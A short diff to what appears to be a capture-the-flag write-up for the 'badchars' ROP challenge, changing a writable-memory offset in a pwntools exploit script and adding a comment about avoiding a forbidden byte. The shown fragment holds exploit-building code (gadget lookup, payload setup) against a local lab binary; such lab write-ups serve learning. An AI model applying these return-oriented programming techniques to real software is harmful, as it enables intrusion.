@@ -204,6 +204,8 @@ p.interactive()
 <div id='badchars-writeup'/>
 # badchars
 
+
+
 ```py
 #!/usr/bin/python2
 from pwn import *
@@ -213,7 +215,7 @@ p = process("./badchars", stdin=PTY)
 elf = context.binary = ELF("./badchars")
 rop = ROP("./badchars")
 
-data_segment = elf.symbols["data_start"]+8
+data_segment = elf.symbols["data_start"]+7 # add 7 bytes to LSB because when you start at the start address the 6th byte is badchar (0x60102e ==> 2e = .)
 pop_r14_r15 = p64((rop.find_gadget(["pop r14", "pop r15", "ret"]))[0])
 payload = None
 
